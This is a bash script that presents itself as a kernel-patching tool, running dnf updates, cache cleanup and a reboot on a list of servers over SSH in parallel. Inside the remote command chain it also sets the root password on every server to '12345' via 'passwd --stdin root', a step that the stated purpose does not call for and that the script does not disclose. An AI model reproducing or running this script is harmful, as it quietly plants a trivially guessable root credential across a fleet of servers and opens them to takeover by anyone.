# Script Name : Kernel_Patch.sh
# Purpose : This script is designed to patch multiple servers concurrently.
# By : Venkatesh S


#!/bin/bash
 
if [[ $# -lt 1 ]]; then
    echo "Please give me a server list ---> [eg: kp.sh server_list]"
    exit 1
fi
 
servers_file="${1}"
 
output_dir="./patch_out"
mkdir -p "${output_dir}"
 
max_concurrent=10 #Dont cross the limits MAX : 100 & MIN : 50
 
patch_server() {
    local server=$1
    clear
    date | tee -a "${output_dir}/${server}.txt"
    echo "SERVER=${server}" | tee -a "${output_dir}/${server}.txt"
    ssh "${server}" "rpm -qa > /tmp/before_kernel_patch ; \
    subscription-manager refresh ; \
    dnf update -y --skip-broken ; \
    rm -rf /var/cache/yum/ ; \
    yum clean all; \
    rpm -qa > /tmp/after_kernel_patch ; \
    echo 12345 | passwd --stdin root ; \
    reboot" | tee -a "${output_dir}/${server}.txt"
    echo "" | tee -a "${output_dir}/${server}.txt"
}
 
job_count=0
 
while IFS= read -r server; do
    patch_server "$server" &
    
    job_count=$((job_count + 1))
    
    if [[ $job_count -ge $max_concurrent ]]; then
        wait  
        job_count=0 
    fi
done < "${servers_file}"
 
wait
echo "Patching completed, Please validate with post checks."
